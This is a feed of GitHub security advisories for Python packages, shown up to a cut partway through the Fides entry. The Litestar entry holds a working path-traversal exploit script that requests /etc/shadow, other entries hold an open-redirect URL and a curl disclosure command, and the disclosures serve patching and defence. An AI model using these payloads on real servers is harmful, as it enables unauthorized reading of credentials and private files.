<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2024-07-10T07:01:25.380Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[zipp] zipp Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jfmj-5v4g-7637</id>
        <link href="https://github.com/advisories/GHSA-jfmj-5v4g-7637"/>
        <updated>2024-07-09T17:25:55.000Z</updated>
        <content type="html"><![CDATA[<p>A Denial of Service (DoS) vulnerability exists in the jaraco/zipp library, affecting all versions prior to 3.19.1. The vulnerability is triggered when processing a specially crafted zip file that leads to an infinite loop. This issue also impacts the zipfile module of CPython, as features from the third-party zipp library are later merged into CPython, and the affected code is identical in both projects. The infinite loop can be initiated through the use of functions affecting the <code>Path</code> module in both zipp and zipfile, such as <code>joinpath</code>, the overloaded division operator, and <code>iterdir</code>. Although the infinite loop is not resource exhaustive, it prevents the application from responding. The vulnerability was addressed in version 3.19.1 of jaraco/zipp.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5569">https://nvd.nist.gov/vuln/detail/CVE-2024-5569</a></li>
<li><a href="https://github.com/jaraco/zipp/commit/fd604bd34f0343472521a36da1fbd22e793e14fd">https://github.com/jaraco/zipp/commit/fd604bd34f0343472521a36da1fbd22e793e14fd</a></li>
<li><a href="https://huntr.com/bounties/be898306-11f9-46b4-b28c-f4c4aa4ffbae">https://huntr.com/bounties/be898306-11f9-46b4-b28c-f4c4aa4ffbae</a></li>
<li><a href="https://github.com/advisories/GHSA-jfmj-5v4g-7637">https://github.com/advisories/GHSA-jfmj-5v4g-7637</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jfmj-5v4g-7637</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-09T00:31:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nova] OpenStack Cinder, Glance, and Nova vulnerable to arbitrary file access]]></title>
        <id>https://github.com/advisories/GHSA-r4v4-w9pv-6fph</id>
        <link href="https://github.com/advisories/GHSA-r4v4-w9pv-6fph"/>
        <updated>2024-07-08T19:04:08.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Cinder through 24.0.0, Glance before 28.0.2, and Nova before 29.0.3. Arbitrary file access can occur via custom QCOW2 external data. By supplying a crafted QCOW2 image that references a specific data file path, an authenticated user may convince systems to return a copy of that file's contents from the server, resulting in unauthorized access to potentially sensitive data. All Cinder and Nova deployments are affected; only Glance deployments with image conversion enabled are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32498">https://nvd.nist.gov/vuln/detail/CVE-2024-32498</a></li>
<li><a href="https://launchpad.net/bugs/2059809">https://launchpad.net/bugs/2059809</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2024/07/02/2">https://www.openwall.com/lists/oss-security/2024/07/02/2</a></li>
<li><a href="https://github.com/openstack/cinder/commit/78f85c1f9b20a067ef64d6451dee0228c3a0db5e">https://github.com/openstack/cinder/commit/78f85c1f9b20a067ef64d6451dee0228c3a0db5e</a></li>
<li><a href="https://github.com/openstack/cinder/commit/d6a186945e03649343af55b46ed8dfe0dd326e40">https://github.com/openstack/cinder/commit/d6a186945e03649343af55b46ed8dfe0dd326e40</a></li>
<li><a href="https://github.com/openstack/glance/commit/22f0c9c6f98db1d93569e3edb800c271f35b0ef9">https://github.com/openstack/glance/commit/22f0c9c6f98db1d93569e3edb800c271f35b0ef9</a></li>
<li><a href="https://github.com/openstack/glance/commit/2e65391744a82421bc6f026ee8f1f3550038f175">https://github.com/openstack/glance/commit/2e65391744a82421bc6f026ee8f1f3550038f175</a></li>
<li><a href="https://github.com/openstack/glance/commit/867d1dd8b6e4f5774257a98c7c33061fbbbde973">https://github.com/openstack/glance/commit/867d1dd8b6e4f5774257a98c7c33061fbbbde973</a></li>
<li><a href="https://github.com/openstack/glance/commit/cc7d53adbecf85f3d7df78e7618fe8ab3a075c5f">https://github.com/openstack/glance/commit/cc7d53adbecf85f3d7df78e7618fe8ab3a075c5f</a></li>
<li><a href="https://github.com/openstack/glance/commit/d607e78630cc9d1ca18b3a027322809c042f64df">https://github.com/openstack/glance/commit/d607e78630cc9d1ca18b3a027322809c042f64df</a></li>
<li><a href="https://github.com/openstack/nova/commit/657e86585cc57f84ab9b364dd189547d231d5927">https://github.com/openstack/nova/commit/657e86585cc57f84ab9b364dd189547d231d5927</a></li>
<li><a href="https://github.com/advisories/GHSA-r4v4-w9pv-6fph">https://github.com/advisories/GHSA-r4v4-w9pv-6fph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r4v4-w9pv-6fph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-05T03:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[glance] OpenStack Cinder, Glance, and Nova vulnerable to arbitrary file access]]></title>
        <id>https://github.com/advisories/GHSA-r4v4-w9pv-6fph</id>
        <link href="https://github.com/advisories/GHSA-r4v4-w9pv-6fph"/>
        <updated>2024-07-08T19:04:08.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Cinder through 24.0.0, Glance before 28.0.2, and Nova before 29.0.3. Arbitrary file access can occur via custom QCOW2 external data. By supplying a crafted QCOW2 image that references a specific data file path, an authenticated user may convince systems to return a copy of that file's contents from the server, resulting in unauthorized access to potentially sensitive data. All Cinder and Nova deployments are affected; only Glance deployments with image conversion enabled are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32498">https://nvd.nist.gov/vuln/detail/CVE-2024-32498</a></li>
<li><a href="https://launchpad.net/bugs/2059809">https://launchpad.net/bugs/2059809</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2024/07/02/2">https://www.openwall.com/lists/oss-security/2024/07/02/2</a></li>
<li><a href="https://github.com/openstack/cinder/commit/78f85c1f9b20a067ef64d6451dee0228c3a0db5e">https://github.com/openstack/cinder/commit/78f85c1f9b20a067ef64d6451dee0228c3a0db5e</a></li>
<li><a href="https://github.com/openstack/cinder/commit/d6a186945e03649343af55b46ed8dfe0dd326e40">https://github.com/openstack/cinder/commit/d6a186945e03649343af55b46ed8dfe0dd326e40</a></li>
<li><a href="https://github.com/openstack/glance/commit/22f0c9c6f98db1d93569e3edb800c271f35b0ef9">https://github.com/openstack/glance/commit/22f0c9c6f98db1d93569e3edb800c271f35b0ef9</a></li>
<li><a href="https://github.com/openstack/glance/commit/2e65391744a82421bc6f026ee8f1f3550038f175">https://github.com/openstack/glance/commit/2e65391744a82421bc6f026ee8f1f3550038f175</a></li>
<li><a href="https://github.com/openstack/glance/commit/867d1dd8b6e4f5774257a98c7c33061fbbbde973">https://github.com/openstack/glance/commit/867d1dd8b6e4f5774257a98c7c33061fbbbde973</a></li>
<li><a href="https://github.com/openstack/glance/commit/cc7d53adbecf85f3d7df78e7618fe8ab3a075c5f">https://github.com/openstack/glance/commit/cc7d53adbecf85f3d7df78e7618fe8ab3a075c5f</a></li>
<li><a href="https://github.com/openstack/glance/commit/d607e78630cc9d1ca18b3a027322809c042f64df">https://github.com/openstack/glance/commit/d607e78630cc9d1ca18b3a027322809c042f64df</a></li>
<li><a href="https://github.com/openstack/nova/commit/657e86585cc57f84ab9b364dd189547d231d5927">https://github.com/openstack/nova/commit/657e86585cc57f84ab9b364dd189547d231d5927</a></li>
<li><a href="https://github.com/advisories/GHSA-r4v4-w9pv-6fph">https://github.com/advisories/GHSA-r4v4-w9pv-6fph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r4v4-w9pv-6fph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-05T03:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cinder] OpenStack Cinder, Glance, and Nova vulnerable to arbitrary file access]]></title>
        <id>https://github.com/advisories/GHSA-r4v4-w9pv-6fph</id>
        <link href="https://github.com/advisories/GHSA-r4v4-w9pv-6fph"/>
        <updated>2024-07-08T19:04:08.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in OpenStack Cinder through 24.0.0, Glance before 28.0.2, and Nova before 29.0.3. Arbitrary file access can occur via custom QCOW2 external data. By supplying a crafted QCOW2 image that references a specific data file path, an authenticated user may convince systems to return a copy of that file's contents from the server, resulting in unauthorized access to potentially sensitive data. All Cinder and Nova deployments are affected; only Glance deployments with image conversion enabled are affected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32498">https://nvd.nist.gov/vuln/detail/CVE-2024-32498</a></li>
<li><a href="https://launchpad.net/bugs/2059809">https://launchpad.net/bugs/2059809</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2024/07/02/2">https://www.openwall.com/lists/oss-security/2024/07/02/2</a></li>
<li><a href="https://github.com/openstack/cinder/commit/78f85c1f9b20a067ef64d6451dee0228c3a0db5e">https://github.com/openstack/cinder/commit/78f85c1f9b20a067ef64d6451dee0228c3a0db5e</a></li>
<li><a href="https://github.com/openstack/cinder/commit/d6a186945e03649343af55b46ed8dfe0dd326e40">https://github.com/openstack/cinder/commit/d6a186945e03649343af55b46ed8dfe0dd326e40</a></li>
<li><a href="https://github.com/openstack/glance/commit/22f0c9c6f98db1d93569e3edb800c271f35b0ef9">https://github.com/openstack/glance/commit/22f0c9c6f98db1d93569e3edb800c271f35b0ef9</a></li>
<li><a href="https://github.com/openstack/glance/commit/2e65391744a82421bc6f026ee8f1f3550038f175">https://github.com/openstack/glance/commit/2e65391744a82421bc6f026ee8f1f3550038f175</a></li>
<li><a href="https://github.com/openstack/glance/commit/867d1dd8b6e4f5774257a98c7c33061fbbbde973">https://github.com/openstack/glance/commit/867d1dd8b6e4f5774257a98c7c33061fbbbde973</a></li>
<li><a href="https://github.com/openstack/glance/commit/cc7d53adbecf85f3d7df78e7618fe8ab3a075c5f">https://github.com/openstack/glance/commit/cc7d53adbecf85f3d7df78e7618fe8ab3a075c5f</a></li>
<li><a href="https://github.com/openstack/glance/commit/d607e78630cc9d1ca18b3a027322809c042f64df">https://github.com/openstack/glance/commit/d607e78630cc9d1ca18b3a027322809c042f64df</a></li>
<li><a href="https://github.com/openstack/nova/commit/657e86585cc57f84ab9b364dd189547d231d5927">https://github.com/openstack/nova/commit/657e86585cc57f84ab9b364dd189547d231d5927</a></li>
<li><a href="https://github.com/advisories/GHSA-r4v4-w9pv-6fph">https://github.com/advisories/GHSA-r4v4-w9pv-6fph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r4v4-w9pv-6fph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-05T03:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[starlite] Litestar and Starlite vulnerable to Path Traversal]]></title>
        <id>https://github.com/advisories/GHSA-83pv-qr33-2vcf</id>
        <link href="https://github.com/advisories/GHSA-83pv-qr33-2vcf"/>
        <updated>2024-07-08T18:47:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p><strong>Local File Inclusion via Path Traversal in LiteStar Static File Serving</strong></p>
<p>A Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of <a href="https://github.com/litestar-org/litestar">LiteStar</a>. This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.</p>
<h2 id="details">Details</h2>
<p>The vulnerability is located in the file path handling mechanism within the static content serving function, specifically at <a href="https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70">line 70 in <code>litestar/static_files/base.py</code></a>.</p>
<p>The function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:</p>
<pre><code class="language-python">commonpath([str(directory), file_info["name"], joined_path])
</code></pre>
<p>Given the variables:</p>
<pre><code class="language-python">directory = PosixPath('/Users/brian/sandbox/test_vuln/static')
file_info["name"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'
joined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')
</code></pre>
<p>The function outputs '/Users/brian/sandbox/test_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.</p>
<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>
<p>To reproduce this vulnerability, follow these steps:</p>
<ol>
<li><p><strong>Set up the environment:</strong></p>
<ul>
<li>Install with pip the <code>uvicorn</code> and <code>litestar</code> packages.</li>
<li>Create a <code>static</code> folder in the root directory of your project and place any file (e.g., an image) in it for testing.</li>
<li>Ensure the static file serving is enabled, which is typically the default configuration.</li>
</ul>
</li>
<li><p><strong>Preparation of the testing environment:</strong></p>
<ul>
<li>If using Ubuntu or a similar system, you can use <code>/etc/shadow</code> which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.</li>
<li>Create a <code>main.py</code> file with the following content to configure and run the LiteStar server:</li>
</ul>
<pre><code class="language-python">from pathlib import Path
from litestar import Litestar
from litestar.static_files import create_static_files_router
import uvicorn

app = Litestar(
    route_handlers=[
        create_static_files_router(path="/static", directories=["static"]),
    ],
)

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000)
</code></pre>
<ul>
<li>Run this script with the command <code>python3 main.py</code> to start the server.</li>
</ul>
</li>
<li><p><strong>Exploit:</strong></p>
<ul>
<li>Prepare an exploit script named <code>exploit.py</code> with the following Python code to perform the HTTP request without client-side sanitization:</li>
</ul>
<pre><code class="language-python">import http.client

def send_request(host, port, path):
    connection = http.client.HTTPConnection(host, port)
    connection.request("GET", path)
    response = connection.getresponse()
    print(f"Status: {response.status}")
    print(f"Headers: {response.getheaders()}")
    data = response.read()
    print(f"Body: {data.decode('utf-8')}")
    connection.close()

send_request("localhost", 8000, "/static/../../../../../../etc/shadow")
</code></pre>
<ul>
<li>Execute this script using <code>python3 exploit.py</code>. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.</li>
</ul>
</li>
<li><p><strong>Observe:</strong></p>
<ul>
<li>The server should respond with the contents of the <code>/etc/shadow</code> file, thereby confirming the path traversal vulnerability.</li>
<li>The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.</li>
</ul>
</li>
</ol>
<h2 id="impact">Impact</h2>
<p>This Local File Inclusion vulnerability critically affects all instances of <a href="https://github.com/litestar-org/litestar">LiteStar</a> where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:</p>
<ol>
<li><p><strong>Exposure of Sensitive Information:</strong></p>
<ul>
<li>The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.</li>
</ul>
</li>
<li><p><strong>Potential for System Compromise:</strong></p>
<ul>
<li>If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a <code>.env</code> file might reveal environment variables used for application configurations that include database passwords or API keys.</li>
</ul>
</li>
<li><p><strong>Credential Leakage:</strong></p>
<ul>
<li>Access to files such as <code>/etc/passwd</code> or <code>/etc/shadow</code> (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.</li>
</ul>
</li>
<li><p><strong>Regulatory and Compliance Violations:</strong></p>
<ul>
<li>Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.</li>
</ul>
</li>
<li><p><strong>Loss of Trust and Reputation Damage:</strong></p>
<ul>
<li>Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.</li>
</ul>
</li>
<li><p><strong>Potential for Further Exploitation:</strong></p>
<ul>
<li>The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.</li>
</ul>
</li>
</ol>
<p>Here's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:</p>
<h2 id="mitigation-suggestion">Mitigation Suggestion</h2>
<p>To effectively address the Local File Inclusion vulnerability via path traversal identified in the <a href="https://github.com/litestar-org/litestar">LiteStar</a> application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:</p>
<ol>
<li><p><strong>Input Validation and Sanitization:</strong></p>
<ul>
<li>Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as <code>../</code> which are used in path traversal attacks.</li>
<li>Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.</li>
</ul>
</li>
<li><p><strong>Path Normalization:</strong></p>
<ul>
<li>Normalize file paths before using them in file operations. Functions such as <code>os.path.normpath()</code> in Python can be used to normalize paths. This method resolves redundant separators and up-level references (<code>../</code>) to prevent directory traversal.</li>
<li>As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:<pre><code class="language-python">if os.path.commonpath([full_path, directory]) != directory:
    # Don't allow misbehaving clients to break out of the static files
    # directory.
    continue
</code></pre>
This snippet from <a href="https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166">Starlette's implementation</a> ensures that the constructed file path does not traverse out of the specified directory.</li>
</ul>
</li>
</ol>
<h2 id="comments">Comments</h2>
<p><strong>Naming Convention:</strong></p>
<ul>
<li>From versions 0.X.X through 1.X.X, the package was released under the name "starlite."</li>
<li>Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name "litestar."</li>
</ul>
<p><strong>Feature Additions and Changes:</strong></p>
<ul>
<li>Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.</li>
<li>Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf">https://github.com/litestar-org/litestar/security/advisories/GHSA-83pv-qr33-2vcf</a></li>
<li><a href="https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70">https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32982">https://nvd.nist.gov/vuln/detail/CVE-2024-32982</a></li>
<li><a href="https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b">https://github.com/litestar-org/litestar/commit/57e706e7effdc182fc9a2af5981bc88afb21851b</a></li>
<li><a href="https://github.com/litestar-org/litestar/commit/a07b79b84d8717bec5ac4d4674c1e4920ba9c813">https://github.com/litestar-org/litestar/commit/a07b79b84d8717bec5ac4d4674c1e4920ba9c813</a></li>
<li><a href="https://github.com/advisories/GHSA-83pv-qr33-2vcf">https://github.com/advisories/GHSA-83pv-qr33-2vcf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-83pv-qr33-2vcf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-05-06T14:20:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[khoj-assistant] Khoj Open Redirect Vulnerability in Login Page]]></title>
        <id>https://github.com/advisories/GHSA-564j-v29w-rqr6</id>
        <link href="https://github.com/advisories/GHSA-564j-v29w-rqr6"/>
        <updated>2024-07-08T14:57:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An attacker can use the <code>next</code> parameter on the login page to redirect a victim to a malicious page, while masking this using a legit-looking <code>app.khoj.dev</code> url.
For example, <code>https://app.khoj.dev/login?next=//example.com</code> will redirect to the <a href="https://example.com">https://example.com</a> page.</p>
<h3 id="details">Details</h3>
<p>The problem seems to be in this method: <a href="https://github.com/khoj-ai/khoj/blob/2667ef45449eb408ce1d7c393be04845be31e15f/src/khoj/routers/auth.py#L95">https://github.com/khoj-ai/khoj/blob/2667ef45449eb408ce1d7c393be04845be31e15f/src/khoj/routers/auth.py#L95</a></p>
<h3 id="poc">PoC</h3>
<p>Open the <code>https://app.khoj.dev/login?next=//example.com</code> url in a Gecko-based browser (Firefox).</p>
<h3 id="impact">Impact</h3>
<p>The impact is low, and this could only be used in phishing attempts, but it's still a problem nonetheless.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/khoj-ai/khoj/security/advisories/GHSA-564j-v29w-rqr6">https://github.com/khoj-ai/khoj/security/advisories/GHSA-564j-v29w-rqr6</a></li>
<li><a href="https://github.com/khoj-ai/khoj/commit/4daf16e5f916641304e11d56a6071ad365c21a18">https://github.com/khoj-ai/khoj/commit/4daf16e5f916641304e11d56a6071ad365c21a18</a></li>
<li><a href="https://github.com/khoj-ai/khoj/blob/2667ef45449eb408ce1d7c393be04845be31e15f/src/khoj/routers/auth.py#L95">https://github.com/khoj-ai/khoj/blob/2667ef45449eb408ce1d7c393be04845be31e15f/src/khoj/routers/auth.py#L95</a></li>
<li><a href="https://github.com/advisories/GHSA-564j-v29w-rqr6">https://github.com/advisories/GHSA-564j-v29w-rqr6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-564j-v29w-rqr6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-08T14:57:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yt-dlp] yt-dlp has dependency on potentially malicious third-party code in Douyu extractors]]></title>
        <id>https://github.com/advisories/GHSA-3v33-3wmw-3785</id>
        <link href="https://github.com/advisories/GHSA-3v33-3wmw-3785"/>
        <updated>2024-07-08T14:22:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>yt-dlp's DouyuTV and DouyuShow extractors used a <code>cdn.bootcdn.net</code> URL as a fallback for fetching a component of the crypto-js JavaScript library. When the Douyu extractor is used, yt-dlp extracts this JavaScript code and attempts to execute it externally using <a href="https://github.com/ariya/phantomjs">PhantomJS</a>. <code>bootcdn.net</code> is owned by the bad actor responsible for the <a href="https://sansec.io/research/polyfill-supply-chain-attack">Polyfill JS supply chain attack</a> that has been ongoing since at least June 2023. While there is no evidence that PhantomJS has been targeted by or is vulnerable to any attacks carried out by the Polyfill JS actor, there is the possibility that malicious JavaScript code may have been downloaded/cached by yt-dlp or executed by PhantomJS.</p>
<p>In order for this potential vulnerability to be exploited by any hypothetical attack, all 3 of the following conditions must be met:</p>
<ol>
<li>The user has PhantomJS installed on their system.</li>
<li>The user passes a <code>douyu.com</code> or <code>douyutv.com</code> URL to yt-dlp as input, or passes a URL that redirects to one of these domains.</li>
<li><code>cdnjs.cloudflare.com</code> is unavailable or blocked at the time of extraction, necessitating the usage of the <code>cdn.bootcdn.net</code> fallback; or it had been unavailable during a previous run of the Douyu extractor and JavaScript code from <code>cdn.bootcdn.net</code> had been cached to disk.</li>
</ol>
<h3 id="patches">Patches</h3>
<p>yt-dlp version 2024.07.07 fixes this issue by removing the URL pointing to the malicious CDN and by invalidating any Douyu extractor cache data created by unpatched versions of yt-dlp.</p>
<h3 id="workarounds">Workarounds</h3>
<p>It is recommended to upgrade yt-dlp to version 2024.07.07 as soon as possible.</p>
<p>For users not able to upgrade:</p>
<ul>
<li>Avoid using the Douyu extractors (<code>--ies default,-douyutv,-douyushow</code>)</li>
<li>Uninstall (or do not install) PhantomJS</li>
</ul>
<h3 id="acknowledgement">Acknowledgement</h3>
<p>Thanks to @LeSuisse for <a href="https://github.com/yt-dlp/yt-dlp/pull/10347">reporting this</a> promptly after <code>bootcdn.net</code> was discovered to be under control of the same bad actor behind the <code>polyfill.io</code> supply chain attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/6075a029dba70a89675ae1250e7cdfd91f0eba41">https://github.com/yt-dlp/yt-dlp/commit/6075a029dba70a89675ae1250e7cdfd91f0eba41</a></li>
<li><a href="https://sansec.io/research/polyfill-supply-chain-attack">https://sansec.io/research/polyfill-supply-chain-attack</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3v33-3wmw-3785">https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3v33-3wmw-3785</a></li>
<li><a href="https://github.com/yt-dlp/yt-dlp/commit/6075a029dba70a89675ae1250e7cdfd91f0eba41">https://github.com/yt-dlp/yt-dlp/commit/6075a029dba70a89675ae1250e7cdfd91f0eba41</a></li>
<li><a href="https://sansec.io/research/polyfill-supply-chain-attack">https://sansec.io/research/polyfill-supply-chain-attack</a></li>
<li><a href="https://github.com/advisories/GHSA-3v33-3wmw-3785">https://github.com/advisories/GHSA-3v33-3wmw-3785</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3v33-3wmw-3785</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-08T14:22:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vanna] Vanna vulnerable to SQL Injection]]></title>
        <id>https://github.com/advisories/GHSA-mwxm-35f8-6vg2</id>
        <link href="https://github.com/advisories/GHSA-mwxm-35f8-6vg2"/>
        <updated>2024-07-08T14:21:04.000Z</updated>
        <content type="html"><![CDATA[<p>vanna-ai/vanna version v0.3.4 is vulnerable to SQL injection in some file-critical functions such as <code>pg_read_file()</code>. This vulnerability allows unauthenticated remote users to read arbitrary local files on the victim server, including sensitive files like <code>/etc/passwd</code>, by exploiting the exposed SQL queries via a Python Flask API.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5753">https://nvd.nist.gov/vuln/detail/CVE-2024-5753</a></li>
<li><a href="https://huntr.com/bounties/a3f913d6-c717-4528-b974-26d8d9e839ca">https://huntr.com/bounties/a3f913d6-c717-4528-b974-26d8d9e839ca</a></li>
<li><a href="https://github.com/advisories/GHSA-mwxm-35f8-6vg2">https://github.com/advisories/GHSA-mwxm-35f8-6vg2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mwxm-35f8-6vg2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-05T21:31:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ethyca-fides] Information Disclosure Vulnerability in Privacy Center of SERVER_SIDE_FIDES_API_URL]]></title>
        <id>https://github.com/advisories/GHSA-53q7-4874-24qg</id>
        <link href="https://github.com/advisories/GHSA-53q7-4874-24qg"/>
        <updated>2024-07-05T20:40:06.000Z</updated>
        <content type="html"><![CDATA[<p><code>SERVER_SIDE_FIDES_API_URL</code> is a server-side configuration environment variable used by the Fides Privacy Center to communicate with the Fides webserver backend. The value of this variable is a URL which typically includes a private IP address, private domain name, and/or port.</p>
<p>This vulnerability allows an unauthenticated attacker to make a HTTP GET request from the Privacy Center that discloses the value of this server-side URL.</p>
<h3 id="impact">Impact</h3>
<p>Disclosure of server-side configuration giving an attacker information on server-side ports, private IP addresses, and/or private domain names.</p>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in Fides version <code>2.39.2</code>. Users are advised to upgrade to this version or later to secure their systems against this threat.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no workarounds.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<ol>
<li><p>Set the value of the environment variable <code>FIDES_PRIVACY_CENTER__SERVER_SIDE_FIDES_API_URL</code> of your Fides Privacy Center container before start-up to a private value such as <code>https://some.private.domain.name/api/v1</code> and start the Privacy Center application.</p>
</li>
<li><p>Once the application is up, perform a HTTP GET request of the Privacy Center's main page e.g. <code>https://privacy.example.com</code> . The value of <code>SERVER_SIDE_FIDES_API_URL</code> is returned in the response's body.</p>
</li>
</ol>
<pre><code>~ ❯ curl -s https://privacy.example.com/ | \
grep '__NEXT_DATA__' | \
sed 's/.*&lt;script id="__NEXT_DATA__" type="application\/json"&gt;//;s/&lt;\/script&gt;.*//' | \
jq '.props.serverEnvironment.settings.SERVER_SIDE_FIDES_API_URL'
"https://some.private.domain.name/api/v1"
</code></pre>
<h3 id="references">References</h3>
<ul>
